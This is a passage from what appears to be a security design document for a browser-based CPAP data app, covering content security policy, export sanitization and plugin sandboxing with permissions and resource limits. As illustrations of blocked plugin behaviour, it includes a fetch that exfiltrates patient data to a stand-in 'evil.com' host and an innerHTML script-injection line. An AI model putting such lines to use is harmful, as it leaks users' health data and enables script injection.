| `img-src`                   | `'self' data: blob:`                                           | Allow images from origin, data URLs (icons), blob URLs (charts)              |
| `font-src`                  | `'self' data:`                                                 | Allow fonts from origin and data URLs                                        |
| `connect-src`               | `'self' https://api.fitbit.com https://api.openweathermap.org` | Allow fetch to same origin and user-configured integrations                  |
| `worker-src`                | `'self' blob:`                                                 | Allow Web Workers from same origin and blob URLs (Comlink)                   |
| `object-src`                | `'none'`                                                       | Disallow plugins (Flash, Java applets)                                       |
| `base-uri`                  | `'self'`                                                       | Prevent <base> tag injection                                                 |
| `form-action`               | `'self'`                                                       | Forms can only submit to same origin (no forms in app, but defense in depth) |
| `frame-ancestors`           | `'none'`                                                       | Prevent embedding in iframes (clickjacking protection)                       |
| `block-all-mixed-content`   | —                                                              | Block HTTP resources on HTTPS page                                           |
| `upgrade-insecure-requests` | —                                                              | Upgrade HTTP requests to HTTPS                                               |

### 6.2 CSP Violation Reporting

**Report-Only Mode** (during development):

```http
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-violation-report;
```

**Violation Handler** (client-side only, no server):

```typescript
// Log CSP violations to console for debugging
document.addEventListener('securitypolicyviolation', (event) => {
  console.error('[CSP Violation]', {
    blockedURI: event.blockedURI,
    violatedDirective: event.violatedDirective,
    originalPolicy: event.originalPolicy,
    sourceFile: event.sourceFile,
    lineNumber: event.lineNumber,
  });

  // Store violation in IndexedDB for user review
  logSecurityEvent({
    type: 'csp-violation',
    timestamp: new Date().toISOString(),
    details: {
      blockedURI: event.blockedURI,
      violatedDirective: event.violatedDirective,
    },
  });
});
```

### 6.3 Script Source Policies

**No Inline Scripts**:

```html
<!-- PROHIBITED -->
<script>
  console.log('inline script');
</script>

<!-- ALLOWED -->
<script src="/assets/main.js"></script>
```

**No `eval()` or `Function()` Constructor**:

```typescript
// PROHIBITED
const fn = new Function('return 1 + 1');
const result = eval('1 + 1');

// ALLOWED
const fn = () => 1 + 1;
const result = fn();
```

**ESLint Enforcement**:

```json
{
  "rules": {
    "no-eval": "error",
    "no-implied-eval": "error",
    "no-new-func": "error"
  }
}
```

### 6.4 Worker Security

**Same-Origin Workers Only**:

```typescript
// SAFE
const worker = new Worker(new URL('./parser.worker.ts', import.meta.url), {
  type: 'module',
});

// UNSAFE (would violate CSP)
// const worker = new Worker('https://cdn.example.com/worker.js');
```

**Worker CSP** (inherited from parent):

- Workers automatically inherit parent CSP
- No additional configuration needed
- Workers cannot make requests to origins not in `connect-src`

---

## 7. Export Security

### 7.1 Safe File Generation

**Sanitize Filenames**:

```typescript
function sanitizeFilename(filename: string): string {
  // Remove path traversal characters
  filename = filename.replace(/[/\\]/g, '_');

  // Remove control characters
  filename = filename.replace(/[\x00-\x1F\x7F]/g, '');

  // Limit length
  if (filename.length > 255) {
    filename = filename.substring(0, 255);
  }

  return filename;
}

function generateExportFilename(machineId: string, dateRange: DateRange): string {
  const sanitized = sanitizeFilename(machineId);
  const start = dateRange.start.replace(/[^0-9]/g, '');
  const end = dateRange.end.replace(/[^0-9]/g, '');
  return `cpap-export-${sanitized}-${start}-${end}.json`;
}
```

**Blob URL Security**:

```typescript
async function exportToFile(data: ExportData): Promise<void> {
  const json = JSON.stringify(data, null, 2);
  const blob = new Blob([json], { type: 'application/json' });
  const url = URL.createObjectURL(blob);

  try {
    // Trigger download
    const a = document.createElement('a');
    a.href = url;
    a.download = generateExportFilename(data.metadata.machineId, data.metadata.dateRange);
    a.click();
  } finally {
    // Revoke blob URL immediately to prevent memory leaks
    URL.revokeObjectURL(url);
  }
}
```

### 7.2 Data Leakage Prevention

**Scrub Exports**:

```typescript
function scrubExportData(data: ExportData): ExportData {
  // Remove user-identifying information if user opts in
  return {
    ...data,
    metadata: {
      ...data.metadata,
      machineId: data.includeDeviceInfo ? data.metadata.machineId : '[REDACTED]',
      machineModel: data.metadata.machineModel, // Clinical relevance, not identifying
    },
    sessions: data.sessions.map((session) => ({
      ...session,
      machineId: data.includeDeviceInfo ? session.machineId : '[REDACTED]',
      importedAt: data.includeTimestamps ? session.importedAt : '[REDACTED]',
    })),
  };
}
```

**Export Confirmation Dialog**:

```typescript
async function confirmExport(): Promise<ExportOptions> {
  return showDialog({
    title: 'Export Data',
    message: 'What would you like to include in the export?',
    options: {
      includeSignalData: {
        label: 'Include high-resolution signal data',
        default: false,
        note: 'Large file size (may be >1 GB)',
      },
      includeDeviceInfo: {
        label: 'Include machine serial number',
        default: false,
        note: 'Device serial may be identifying information',
      },
      includeTimestamps: {
        label: 'Include exact import timestamps',
        default: false,
        note: 'Timestamps may reveal usage patterns',
      },
      encrypt: {
        label: 'Encrypt export with password',
        default: true,
        note: 'Recommended for sharing or backup',
      },
    },
  });
}
```

### 7.3 Format Validation

**Validate Generated JSON**:

```typescript
function validateExportJSON(data: ExportData): void {
  // Schema validation
  if (typeof data.version !== 'string') {
    throw new Error('Invalid export: missing version');
  }

  if (!Array.isArray(data.sessions)) {
    throw new Error('Invalid export: sessions must be array');
  }

  // Circular reference check
  try {
    JSON.stringify(data);
  } catch (error) {
    throw new Error('Invalid export: circular reference detected');
  }

  // Size sanity check
  const size = new Blob([JSON.stringify(data)]).size;
  if (size > 10_000_000_000) {
    // 10 GB
    throw new Error('Export exceeds maximum size (10 GB)');
  }
}
```

---

## 8. Plugin Security & Sandboxing

This section addresses **QA GAP-7 (IMPORTANT)**: comprehensive plugin security architecture to prevent malicious or buggy plugins from accessing user data inappropriately, crashing the application, or compromising privacy.

### 8.1 Plugin Threat Model

Third-party plugins represent a significant attack surface. The plugin system must defend against three threat categories:

#### 8.1.1 Malicious Plugins

**Threat**: Plugins intentionally designed to harm users or exfiltrate data.

**Attack Vectors**:

- **Data Exfiltration**: Plugin makes unauthorized network requests to send PHI to attacker-controlled servers
- **XSS Injection**: Plugin injects malicious scripts into rendered UI components (for visualization plugins)
- **Storage Corruption**: Plugin writes malformed data that crashes the application or corrupts analysis results
- **Credential Harvesting**: Plugin attempts to access API keys, OAuth tokens, or integration credentials
- **Backdoor Installation**: Plugin installs persistent malicious code in ServiceWorker or storage

**Mitigation Priority**:

1. **CRITICAL**: Prevent network access unless explicitly permitted and user-approved (`network` permission)
2. **CRITICAL**: Isolate plugin execution in Web Workers (no DOM/storage direct access)
3. **HIGH**: Validate all plugin outputs before writing to storage
4. **HIGH**: Content Security Policy prevents inline scripts and eval()
5. **MEDIUM**: Code integrity verification (hash checking)

#### 8.1.2 Buggy Plugins

**Threat**: Well-intentioned plugins with implementation flaws that cause harm.

**Attack Vectors**:

- **Crashes**: Unhandled exceptions crash the application
- **Memory Leaks**: Plugin allocates memory without freeing, causing browser OOM
- **Infinite Loops**: Plugin hangs indefinitely, freezing the application
- **Corrupted Analysis**: Plugin math errors produce incorrect clinical metrics (dangerous for health monitoring)
- **Race Conditions**: Plugin concurrent access causes data inconsistency

**Mitigation Priority**:

1. **CRITICAL**: Worker timeout enforcement (kill runaway plugins)
2. **CRITICAL**: Error isolation (plugin crashes don't crash main app)
3. **HIGH**: Memory limits per worker instance
4. **MEDIUM**: Result validation (schema checking, bounds checking)
5. **LOW**: Plugin test suite requirements (unit tests for correctness)

#### 8.1.3 Supply Chain Attacks

**Threat**: Compromised plugin dependencies introduce malicious code.

**Attack Vectors**:

- **Backdoored Dependencies**: Plugin depends on npm package with malicious code
- **Typosquatting**: Plugin claims to be "@resmed-official/parser" but is actually a fake
- **Compromised Maintainer**: Legitimate plugin updated with malicious version by compromised developer account
- **Vulnerable Dependencies**: Plugin uses outdated dependencies with known vulnerabilities

**Mitigation Priority**:

1. **CRITICAL**: Plugin code review before installation (automated + manual)
2. **HIGH**: Dependency scanning (npm audit, Snyk, etc.)
3. **HIGH**: Plugin signing and verification (future enhancement)
4. **MEDIUM**: Version pinning (prevent automatic updates without user approval)
5. **MEDIUM**: Plugin provenance tracking (verify source repository)

**Mitigation Priority Matrix**:

```text
Threat Category          | Prevention Priority | Detection Priority | Response Priority
-------------------------|--------------------|--------------------|------------------
Data Exfiltration        | CRITICAL           | HIGH               | CRITICAL
XSS Injection           | CRITICAL           | MEDIUM             | HIGH
Storage Corruption      | HIGH               | HIGH               | MEDIUM
Crashes/Hangs           | CRITICAL           | CRITICAL           | LOW
Memory Leaks            | HIGH               | MEDIUM             | MEDIUM
Corrupted Analysis      | MEDIUM             | HIGH               | HIGH
Supply Chain Compromise | HIGH               | MEDIUM             | CRITICAL
```

### 8.2 Web Worker Isolation

**Why Web Workers Provide Isolation**:

Web Workers execute JavaScript in a **separate thread with a completely isolated global scope**. This provides the foundation for plugin sandboxing:

1. **No DOM Access**: Workers cannot access `window`, `document`, or any DOM APIs. Plugins cannot manipulate UI, inject scripts, or read sensitive page content.

2. **No Storage APIs**: Workers do not have direct access to `localStorage`, `sessionStorage`, or `document.cookie`. Plugins cannot steal credentials or read other plugins' cached data.

3. **Separate Global Scope**: Each worker has its own global object. Plugins cannot access variables, functions, or state from the main thread or other plugins.

4. **Controlled Communication**: Workers communicate with main thread only via `postMessage()` (wrapped by Comlink). All data transfers are serialized—plugins cannot pass references to live objects.

**What Plugins CAN Access**:

```typescript
// Inside plugin worker context
// ✅ Allowed:
- self (WorkerGlobalScope, not Window)
- Comlink API provided by plugin manager
- Data explicitly passed via postMessage (copied, not referenced)
- Worker-scoped APIs: setTimeout, setInterval, fetch (if permitted)
- Typed arrays, ArrayBuffers (data processing)
- Math, Date, console, WebAssembly
- crypto.subtle (Web Crypto API)

// ❌ Denied:
- window, document, DOM APIs
- localStorage, sessionStorage, indexedDB (direct)
- navigator.storage, OPFS (direct)
- document.cookie
- alert(), confirm(), prompt()
- Other workers or plugin instances
```

**What Plugins CANNOT Access**:

```typescript
// Example of plugin attempting unauthorized access:

// ❌ Fails: DOM access
const elem = document.getElementById('secret-data');
// ReferenceError: document is not defined

// ❌ Fails: Storage access
const token = localStorage.getItem('fitbit-oauth-token');
// ReferenceError: localStorage is not defined

// ❌ Fails: Network (without permission)
await fetch('https://evil.com/exfiltrate', { method: 'POST', body: patientData });
// Throws SecurityError if plugin lacks 'network' permission

// ❌ Fails: Other plugin data
const otherPluginData = self.pluginRegistry.getPlugin('other-plugin').data;
// ReferenceError: pluginRegistry is not defined (not exposed to workers)

// ❌ Fails: OPFS direct access
const root = await navigator.storage.getDirectory();
// Available in workers BUT restricted by permission model
```

**Limitations of Worker Isolation (Not a Security Sandbox)**:

⚠️ **Important**: Web Workers are **NOT** a security sandbox. They provide isolation but not true confinement:

1. **Shared Origin**: Workers run in the same origin as main thread. Same-origin storage is technically accessible if worker has storage APIs.
   - **Mitigation**: We do not expose storage APIs to plugin workers. Plugins must use controlled DataProvider API.

2. **Network Access**: Workers can make `fetch()` calls if the API is available.
   - **Mitigation**: Network permission required; fetch is wrapped to enforce permission checks.

3. **Resource Exhaustion**: Workers can consume CPU and memory without browser-enforced limits.
   - **Mitigation**: Application-level timeouts, memory monitoring, worker termination.

4. **No Filesystem Sandbox**: Workers in Node.js (testing) have filesystem access.
   - **Mitigation**: Production plugins run in browser workers only; Node.js test environment uses mocks.

**Trust Model**: We treat plugin code as **untrusted** but rely on **browser-provided isolation** (separate worker threads) combined with **application-level access controls** (permission system, API wrapping, data filtering).

### 8.3 Plugin Permission System

Plugins must declare all required capabilities in their manifest. Permissions are enforced at runtime with explicit user consent.

#### 8.3.1 Permission Types

```typescript
/**
 * Plugin permission grants.
 * Every permission must have user consent and is enforced at runtime.
 */
type PluginPermission =
  // Data Access Permissions
  | 'storage.read' // Read data from storage via controlled API
  | 'storage.write' // Write analysis results back to storage
  | 'storage.delete' // Delete cached results or temporary data

  // Data Scope Permissions (combine with storage.read)
  | 'data.sessions' // Access session metadata (dates, duration, machine)
  | 'data.aggregates' // Access nightly aggregate statistics
  | 'data.events' // Access respiratory event data (apneas, hypopneas)
  | 'data.signals' // Access high-resolution time-series signals
  | 'data.notes' // Access user notes and annotations
  | 'data.integrations.fitbit' // Access Fitbit integration data
  | 'data.integrations.weather' // Access weather data

  // Network Permissions (generally denied for analysis plugins)
  | 'network' // Make external HTTP requests

  // Export Permissions
  | 'export' // Export data in custom formats

  // UI Permissions (for visualization plugins)
  | 'ui.render'; // Render React components (sandboxed)

/**
 * Complete plugin manifest schema with integrity and permission fields
 */
interface PluginManifest {
  // Identity
  id: string; // Unique plugin ID (reverse domain: com.example.plugin)
  name: string; // Human-readable name
  version: string; // Semantic version
  author: string; // Developer name/organization
  description: string; // What the plugin does

  // Plugin type (determines API interface)
  type: 'machine' | 'analysis' | 'visualization' | 'integration' | 'export';

  // Security
  permissions: PluginPermission[]; // Required permissions
  integrityHash: string; // SHA-256 hash of plugin code
  sourceUrl?: string; // GitHub repo or package URL for audit

  // Data requirements
  dataRequirements?: {
    signals?: string[]; // Signal channels needed (e.g., ['Flow', 'Pressure'])
    minSessionCount?: number; // Minimum sessions required for analysis
    maxMemoryMB?: number; // Expected memory usage
  };

  // Resource limits
  timeoutMs?: number; // Max execution time (default: 60s)
  maxMemoryMB?: number; // Memory limit (default: 512MB)

  // Entry point
  main: string; // Worker script path or bundle
}
```

#### 8.3.2 User Consent Flow

**Installation consent dialog**:

```typescript
async function installPlugin(manifest: PluginManifest): Promise<void> {
  // 1. Validate manifest schema
  const schemaValidation = validateManifestSchema(manifest);
  if (!schemaValidation.valid) {
    throw new ValidationError(
      `Invalid plugin manifest: ${schemaValidation.errors.join(', ')}`
    );
  }

  // 2. Show permission consent UI
  const consent = await showPluginConsentDialog({
    pluginName: manifest.name,
    author: manifest.author,
    description: manifest.description,
    permissions: manifest.permissions,
    dataRequirements: manifest.dataRequirements,
    sourceUrl: manifest.sourceUrl
  });

  if (!consent.granted) {
    throw new UserCancelledError('User denied plugin permissions');
  }

  // 3. Store plugin with granted permissions
  const installRecord: PluginInstallRecord = {
    manifest,
    installedAt: new Date().toISOString(),
    grantedPermissions: consent.grantedPermissions, // User can deny specific permissions
    enabled: true,
    integrityVerified: false
  };

  // 4. Verify code integrity
  const integrityCheck = await verifyPluginIntegrity(manifest);
  if (!integrityCheck.valid) {
    throw new SecurityError(
      `Plugin integrity verification failed: ${integrityCheck.error}`
    );
  }
  installRecord.integrityVerified = true;

  // 5. Save to plugin registry
  await pluginRegistry.install(installRecord);

  console.log(`[PluginManager] Installed plugin: ${manifest.id}@${manifest.version}`);
}

/**
 * User-facing permission descriptions
 */
const PERMISSION_DESCRIPTIONS: Record<PluginPermission, {
  label: string;
  description: string;
  risk: 'LOW' | 'MEDIUM' | 'HIGH';
}> = {
  'storage.read': {
    label: 'Read Your CPAP Data',
    description: 'Access your therapy sessions, statistics, and events for analysis.',
    risk: 'MEDIUM'
  },
  'storage.write': {
    label: 'Save Analysis Results',
    description: 'Store computed results (cached calculations, derived metrics).',
    risk: 'LOW'
  },
  'data.signals': {
    label: 'Access High-Resolution Signals',
    description: 'Read raw waveform data (flow, pressure) at 25-50 Hz resolution.',
    risk: 'HIGH' // Most sensitive data
  },
  'network': {
    label: 'Make Network Requests',
    description: 'Send data to external services (e.g., cloud ML inference).',
    risk: 'HIGH' // Privacy risk
  },
  'export': {
    label: 'Export Data',
    description: 'Generate files for download (PDF reports, CSV exports).',
    risk: 'MEDIUM'
  },
  // ... (all permissions)
};

/**
 * Permission consent dialog component
 */
function PluginConsentDialog({ plugin, onConsent }: {
  plugin: PluginManifest;
  onConsent: (granted: boolean, selectedPermissions: PluginPermission[]) => void;
}) {
  const [selectedPermissions, setSelectedPermissions] = useState<Set<PluginPermission>>(
    new Set(plugin.permissions)
  );

  return (
    <Dialog>
      <DialogTitle>Install Plugin: {plugin.name}</DialogTitle>
      <DialogContent>
        <Typography variant="body1">{plugin.description}</Typography>
        <Typography variant="body2">By {plugin.author}</Typography>

        <Box mt={2}>
          <Typography variant="h6">Requested Permissions</Typography>
          {plugin.permissions.map(perm => {
            const info = PERMISSION_DESCRIPTIONS[perm];
            return (
              <PermissionCard key={perm} selected={selectedPermissions.has(perm)}>
                <Checkbox
                  checked={selectedPermissions.has(perm)}
                  onChange={() => togglePermission(perm)}
                />
                <PermissionBadge risk={info.risk}>{info.risk}</PermissionBadge>
                <Typography variant="subtitle1">{info.label}</Typography>
                <Typography variant="body2">{info.description}</Typography>
              </PermissionCard>
            );
          })}
        </Box>

        {plugin.sourceUrl && (
          <Link href={plugin.sourceUrl} target="_blank">
            View Source Code
          </Link>
        )}
      </DialogContent>

      <DialogActions>
        <Button onClick={() => onConsent(false, [])}>Deny</Button>
        <Button
          variant="contained"
          onClick={() => onConsent(true, Array.from(selectedPermissions))}
        >
          Allow
        </Button>
      </DialogActions>
    </Dialog>
  );
}
```

#### 8.3.3 Runtime Permission Checking

Every plugin API call is guarded by permission checks:

```typescript
/**
 * DataProvider API wrapper with permission enforcement.
 * This is the ONLY interface plugins have to access application data.
 */
class SecureDataProvider {
  constructor(
    private plugin: PluginManifest,
    private grantedPermissions: Set<PluginPermission>,
  ) {}

  /**
   * Check if plugin has required permission
   */
  private enforce(permission: PluginPermission): void {
    if (!this.grantedPermissions.has(permission)) {
      throw new SecurityError(
        `Permission denied: Plugin "${this.plugin.id}" does not have permission "${permission}"`,
        'PERMISSION_DENIED',
        { pluginId: this.plugin.id, permission },
      );
    }
  }

  /**
   * Get session metadata (dates, durations, machine info)
   */
  async getSessions(filter?: SessionFilter): Promise<SessionMetadata[]> {
    this.enforce('storage.read');
    this.enforce('data.sessions');

    // Fetch from storage
    const sessions = await sessionStore.query(filter);

    // Strip PHI-like fields if not explicitly requested
    return sessions.map((s) => ({
      id: s.id,
      date: s.date,
      duration: s.duration,
      machineModel: s.machineModel,
      // Omit: notes, user metadata
    }));
  }

  /**
   * Get high-resolution signal data (requires highest permission level)
   */
  async getSignalData(sessionId: string, channelName: string): Promise<Float32Array> {
    this.enforce('storage.read');
    this.enforce('data.signals');

    // Verify channel is declared in manifest
    const declared = this.plugin.dataRequirements?.signals || [];
    if (!declared.includes(channelName)) {
      throw new SecurityError(
        `Undeclared signal access: Plugin manifest must declare signal "${channelName}"`,
        'UNDECLARED_DATA_ACCESS',
        { pluginId: this.plugin.id, channelName, declaredSignals: declared },
      );
    }

    // Fetch signal from OPFS
    return await signalStorage.getSignal(sessionId, channelName);
  }

  /**
   * Write analysis results back to storage
   */
  async saveAnalysisResult(result: AnalysisResult): Promise<void> {
    this.enforce('storage.write');

    // Validate result schema before saving
    const validation = validateAnalysisResult(result);
    if (!validation.valid) {
      throw new ValidationError(`Invalid analysis result: ${validation.errors.join(', ')}`);
    }

    // Tag result with plugin ID for provenance
    const tagged: StoredAnalysisResult = {
      ...result,
      pluginId: this.plugin.id,
      computedAt: new Date().toISOString(),
    };

    await analysisStore.save(tagged);
  }

  /**
   * Make external network request (requires network permission)
   */
  async fetch(url: string, options?: RequestInit): Promise<Response> {
    this.enforce('network');

    // Log network requests for audit
    console.warn(`[Security] Plugin "${this.plugin.id}" making network request to ${url}`);

    // Apply timeout
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 30_000);

    try {
      return await fetch(url, {
        ...options,
        signal: controller.signal,
      });
    } finally {
      clearTimeout(timeout);
    }
  }
}
```

### 8.4 Data Access Control

**Principle**: Plugins receive **only explicitly passed data**, never direct storage access.

#### 8.4.1 Data Filtering

Plugins receive only the data they need for their declared functionality:

```typescript
/**
 * Filter data before passing to plugin
 */
async function preparePluginInput(
  plugin: PluginManifest,
  userSelection: UserDataSelection,
): Promise<PluginInput> {
  const dataProvider = createSecureDataProvider(plugin);

  // Example: Analysis plugin needs aggregate stats only, not raw signals
  if (plugin.type === 'analysis' && !plugin.permissions.includes('data.signals')) {
    // Pass aggregates only (much smaller than raw signals)
    const aggregates = await dataProvider.getNightlyAggregates(userSelection.dateRange);

    return {
      type: 'aggregates',
      data: aggregates,
      metadata: {
        sessionCount: aggregates.length,
        dateRange: userSelection.dateRange,
      },
    };
  }

  // Example: Export plugin needs full session data
  if (plugin.type === 'export' && plugin.permissions.includes('data.signals')) {
    const sessions = await dataProvider.getSessions(userSelection.dateRange);
    const signals = await Promise.all(
      sessions.map((s) => dataProvider.getSignalData(s.id, 'Flow')),
    );

    return {
      type: 'full-sessions',
      sessions,
      signals,
    };
  }

  throw new Error(`Cannot prepare input for plugin type: ${plugin.type}`);
}
```

#### 8.4.2 Copy-on-Write (Data Cloning)

Plugins receive **copies** of data, not references. This prevents plugins from modifying application state:

```typescript
/**
 * Clone data before passing to plugin worker
 */
function cloneForWorker<T>(data: T): T {
  // Use structured clone algorithm (supports typed arrays, dates, etc.)
  return structuredClone(data);
}

async function executePlugin(plugin: PluginManifest, input: PluginInput): Promise<PluginOutput> {
  const worker = createPluginWorker(plugin);

  // Clone input data (prevents plugin from modifying original)
  const clonedInput = cloneForWorker(input);

  // Send via Comlink (also performs serialization/copy)
  const result = await worker.execute(clonedInput);

  // Clone result as well (paranoid but safe)
  return cloneForWorker(result);
}
```

#### 8.4.3 Result Validation Before Storage

All plugin outputs are validated before writing to storage:

```typescript
/**
 * Validate plugin analysis result before saving
 */
function validateAnalysisResult(result: AnalysisResult): ValidationResult {
  const errors: string[] = [];

  // Schema validation
  if (!result.pluginId || typeof result.pluginId !== 'string') {
    errors.push('Missing or invalid pluginId');
  }

  if (!result.data || typeof result.data !== 'object') {
    errors.push('Missing result data');
  }

  // Bounds checking for clinical metrics (prevent corrupted analysis)
  if (result.data.ahi !== undefined) {
    if (typeof result.data.ahi !== 'number' || result.data.ahi < 0 || result.data.ahi > 200) {
      errors.push(`Invalid AHI value: ${result.data.ahi} (must be 0-200)`);
    }
  }

  if (result.data.leakRate !== undefined) {
    if (
      typeof result.data.leakRate !== 'number' ||
      result.data.leakRate < 0 ||
      result.data.leakRate > 100
    ) {
      errors.push(`Invalid leak rate: ${result.data.leakRate} (must be 0-100 L/min)`);
    }
  }

  // Size limits (prevent storage exhaustion)
  const serialized = JSON.stringify(result);
  const sizeMB = new Blob([serialized]).size / (1024 * 1024);
  if (sizeMB > 10) {
    errors.push(`Result too large: ${sizeMB.toFixed(2)}MB (limit: 10MB)`);
  }

  return {
    valid: errors.length === 0,
    errors,
  };
}

/**
 * Save plugin result with validation
 */
async function savePluginResult(result: AnalysisResult): Promise<void> {
  const validation = validateAnalysisResult(result);

  if (!validation.valid) {
    throw new ValidationError(
      `Plugin result validation failed: ${validation.errors.join(', ')}`,
      'INVALID_PLUGIN_OUTPUT',
      { pluginId: result.pluginId, errors: validation.errors },
    );
  }

  await analysisStore.save(result);
}
```

### 8.5 API Surface Restriction

**Principle**: Plugins have access only to a **minimal, capability-based API**. No access to internal app state, other plugins, or privileged operations.

#### 8.5.1 Limited Comlink API

Plugins interact with the application via a restricted Comlink interface:

```typescript
/**
 * Plugin Worker API Interface
 * This is the COMPLETE surface area exposed to plugin code.
 */
interface PluginWorkerAPI {
  /**
   * Data access (permission-controlled)
   */
  dataProvider: {
    getSessions(filter?: SessionFilter): Promise<SessionMetadata[]>;
    getNightlyAggregates(dateRange: DateRange): Promise<AggregateStat[]>;
    getEvents(sessionId: string): Promise<RespiratoryEvent[]>;
    getSignalData(sessionId: string, channel: string): Promise<Float32Array>;
    saveResult(result: AnalysisResult): Promise<void>;
  };

  /**
   * Logging (no PHI, captured for debugging)
   */
  logger: {
    info(message: string, context?: Record<string, unknown>): void;
    warn(message: string, context?: Record<string, unknown>): void;
    error(message: string, error?: Error): void;
  };

  /**
   * Progress reporting (for long-running analyses)
   */
  progress: {
    report(percent: number, message?: string): void;
  };
}

/**
 * Setup plugin worker with restricted API
 */
function createPluginWorker(plugin: PluginManifest): Worker {
  const worker = new Worker(new URL('./plugin-sandbox.worker.ts', import.meta.url), {
    type: 'module',
    name: `plugin-${plugin.id}`,
  });

  // Expose ONLY the PluginWorkerAPI via Comlink
  const dataProvider = createSecureDataProvider(plugin);
  const logger = createPluginLogger(plugin.id);
  const progress = createProgressReporter(plugin.id);

  const api: PluginWorkerAPI = {
    dataProvider: Comlink.proxy(dataProvider),
    logger: Comlink.proxy(logger),
    progress: Comlink.proxy(progress),
  };

  Comlink.expose(api, worker);

  return worker;
}
```

#### 8.5.2 No Access to Internal State

Plugins cannot access application internals:

```typescript
// ❌ Plugin CANNOT do this (not exposed):

// Access Zustand stores
const userSettings = useSettingsStore.getState();

// Access other plugins
const otherPlugin = pluginRegistry.get('other-plugin-id');

// Access routing
navigate('/settings');

// Access localStorage directly
const theme = localStorage.getItem('theme');

// Access service worker
const registration = await navigator.serviceWorker.getRegistration();

// Modify DOM
document.getElementById('app').innerHTML = '<script>alert("XSS")</script>';
```

#### 8.5.3 Capability-Based Security

Plugins receive **handles** (capabilities) to **specific resources** based on user selection:

```typescript
/**
 * User selects specific sessions for analysis
 * Plugin receives ONLY those sessions
 */
async function runAnalysisPlugin(
  plugin: PluginManifest,
  selectedSessionIds: string[],
): Promise<AnalysisResult> {
  const worker = createPluginWorker(plugin);

  // Filter data to user selection only
  const sessions = await sessionStore.getByIds(selectedSessionIds);

  // Plugin receives capability to access ONLY these sessions
  const capability = createSessionCapability(selectedSessionIds);

  return await worker.execute({
    sessions,
    capability, // Capability token, not raw storage access
  });
}
```

### 8.6 Resource Limits

**Principle**: Plugins cannot exhaust system resources and degrade application performance.

#### 8.6.1 Memory Limits

```typescript
/**
 * Worker memory monitoring (best-effort, not enforceable by spec)
 */
async function executePluginWithMemoryLimit(
  plugin: PluginManifest,
  input: PluginInput,
): Promise<PluginOutput> {
  const worker = createPluginWorker(plugin);
  const maxMemoryMB = plugin.maxMemoryMB || 512;

  // Monitor worker memory usage (if available)
  if ('memory' in performance) {
    const memoryMonitor = setInterval(() => {
      const usage = (performance as any).memory.usedJSHeapSize / (1024 * 1024);

      if (usage > maxMemoryMB) {
        console.error(
          `[PluginManager] Plugin "${plugin.id}" exceeded memory limit: ${usage.toFixed(0)}MB > ${maxMemoryMB}MB`,
        );
        worker.terminate();
        clearInterval(memoryMonitor);
      }
    }, 1000);

    try {
      return await worker.execute(input);
    } finally {
      clearInterval(memoryMonitor);
    }
  }

  // Fallback: no memory monitoring (still have timeout)
  return await worker.execute(input);
}
```

**Note**: JavaScript does not provide hard memory limits per worker. The memory monitoring above is **best-effort** using `performance.memory` (Chrome only). The primary protection is **execution timeout** (kills runaway workers).

#### 8.6.2 CPU Time Limits

```typescript
/**
 * Enforce plugin execution timeout
 */
async function executePluginWithTimeout(
  plugin: PluginManifest,
  input: PluginInput,
): Promise<PluginOutput> {
  const worker = createPluginWorker(plugin);
  const timeoutMs = plugin.timeoutMs || 60_000; // Default: 60 seconds

  const executionPromise = worker.execute(input);
  const timeoutPromise = new Promise<never>((_, reject) => {
    setTimeout(() => {
      worker.terminate(); // Kill worker
      reject(
        new TimeoutError(
          `Plugin "${plugin.id}" exceeded timeout: ${timeoutMs}ms`,
          'PLUGIN_TIMEOUT',
          { pluginId: plugin.id, timeoutMs },
        ),
      );
    }, timeoutMs);
  });

  try {
    return await Promise.race([executionPromise, timeoutPromise]);
  } catch (error) {
    worker.terminate(); // Ensure worker is killed on error
    throw error;
  }
}
```

#### 8.6.3 Storage Quota Limits

```typescript
/**
 * Prevent plugins from exhausting storage quota
 */
async function savePluginResultWithQuota(
  plugin: PluginManifest,
  result: AnalysisResult,
): Promise<void> {
  // Check current quota usage
  const quota = await navigator.storage.estimate();
  const usagePercent = ((quota.usage || 0) / (quota.quota || 1)) * 100;

  if (usagePercent > 90) {
    throw new QuotaExceededError(
      'Storage quota exceeded. Cannot save plugin result.',
      'STORAGE_QUOTA_EXCEEDED',
      { usagePercent, quotaMB: (quota.quota || 0) / (1024 * 1024) },
    );
  }

  // Check result size
  const resultSizeMB = new Blob([JSON.stringify(result)]).size / (1024 * 1024);
  const maxPluginResultSizeMB = 10;

  if (resultSizeMB > maxPluginResultSizeMB) {
    throw new ValidationError(
      `Plugin result too large: ${resultSizeMB.toFixed(2)}MB (limit: ${maxPluginResultSizeMB}MB)`,
      'RESULT_TOO_LARGE',
      { pluginId: plugin.id, resultSizeMB, limitMB: maxPluginResultSizeMB },
    );
  }

  await analysisStore.save(result);
}
```

#### 8.6.4 Automatic Termination on Resource Abuse

```typescript
/**
 * Combined resource limits with automatic termination
 */
async function executePluginSafely(
  plugin: PluginManifest,
  input: PluginInput,
): Promise<PluginOutput> {
  const worker = createPluginWorker(plugin);
  let terminated = false;

  // Timeout guard
  const timeoutMs = plugin.timeoutMs || 60_000;
  const timeoutHandle = setTimeout(() => {
    console.error(`[PluginManager] Terminating plugin "${plugin.id}": timeout`);
    worker.terminate();
    terminated = true;
  }, timeoutMs);

  // Memory guard (best-effort)
  const memoryLimitMB = plugin.maxMemoryMB || 512;
  const memoryHandle = setInterval(() => {
    if ((performance as any).memory) {
      const usageMB = (performance as any).memory.usedJSHeapSize / (1024 * 1024);
      if (usageMB > memoryLimitMB) {
        console.error(`[PluginManager] Terminating plugin "${plugin.id}": memory limit`);
        worker.terminate();
        terminated = true;
      }
    }
  }, 1000);

  try {
    const result = await worker.execute(input);

    if (terminated) {
      throw new ResourceLimitError(
        `Plugin "${plugin.id}" was terminated for exceeding resource limits`,
      );
    }

    return result;
  } finally {
    clearTimeout(timeoutHandle);
    clearInterval(memoryHandle);
    worker.terminate(); // Always terminate when done
  }
}
```

### 8.7 Error Isolation

**Principle**: Plugin failures must not crash the main application. Users should always have a recovery path.

#### 8.7.1 Plugin Crashes Don't Crash Main App

```typescript
/**
 * Execute plugin with error isolation
 */
async function executePluginIsolated(
  plugin: PluginManifest,
  input: PluginInput,
): Promise<Result<PluginOutput, PluginError>> {
  try {
    const output = await executePluginSafely(plugin, input);
    return { ok: true, value: output };
  } catch (error) {
    // Classify error for user messaging
    const pluginError = classifyPluginError(plugin, error);

    // Log for debugging (no PHI)
    console.error(`[PluginManager] Plugin execution failed:`, {
